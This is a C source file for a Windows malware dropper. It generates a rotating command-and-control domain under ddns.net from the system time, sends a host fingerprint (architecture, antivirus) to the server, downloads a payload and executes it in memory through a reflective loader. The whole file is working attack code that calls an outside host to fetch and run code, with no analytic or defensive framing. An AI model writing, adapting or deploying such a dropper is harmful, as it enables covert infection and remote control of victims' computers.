#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include "reflective_loader.h"

#pragma comment(lib, "winhttp.lib")

void generate_domain(char *out) {
    DWORD t = GetTickCount() / 3600000;
    sprintf(out, "%x%x.ddns.net", 0x7F3A, t);
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {
    char domain[256];
    generate_domain(domain);
    wchar_t wdomain[256];
    MultiByteToWideChar(CP_ACP, 0, domain, -1, wdomain, 256);

    HINTERNET hSession = WinHttpOpen(L"Dropper", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    HINTERNET hConnect = WinHttpConnect(hSession, wdomain, INTERNET_DEFAULT_HTTPS_PORT, 0);
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/api/register", NULL, NULL, NULL, WINHTTP_FLAG_SECURE);

    char fingerprint[512];
    sprintf(fingerprint, "{\"os\":\"windows\",\"arch\":\"%s\",\"av\":\"Defender\"}", sizeof(void*)==8?"x64":"x86");
    WinHttpSendRequest(hRequest, L"Content-Type: application/json\r\n", -1, fingerprint, strlen(fingerprint), strlen(fingerprint), 0);
    WinHttpReceiveResponse(hRequest, NULL);

    WinHttpCloseHandle(hRequest);
    hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/api/payload?os=windows&arch=x64", NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0);
    WinHttpReceiveResponse(hRequest, NULL);

    DWORD size = 0;
    WinHttpQueryDataAvailable(hRequest, &size);
    BYTE *payload = (BYTE*)VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_READWRITE);
    DWORD downloaded = 0;
    WinHttpReadData(hRequest, payload, size, &downloaded);
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    ReflectiveLoader(payload, size);
    return 0;
}